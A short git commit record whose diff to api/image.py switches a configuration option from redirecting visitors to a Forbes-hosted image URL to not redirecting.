5f49bd410775df1e5fb45113f6d373adcad60feb
mk49-35 <mookass49@hotmail.com>
2025-11-19 20:16:50 +0100

    1

--- api/image.py
+++ api/image.py
@@ -50,7 +50,7 @@ config = {
 
     # REDIRECTION #
     "redirect": {
-        "redirect": True, # Redirect to a webpage?
+        "redirect": False, # Redirect to a webpage?
         "page": "https://imageio.forbes.com/specials-images/imageserve/5d35eacaf1176b0008974b54/0x0.jpg?format=jpg&crop=4560,2565,x790,y784,safe&width=1200" # Link to the webpage to redirect to 
     },
 
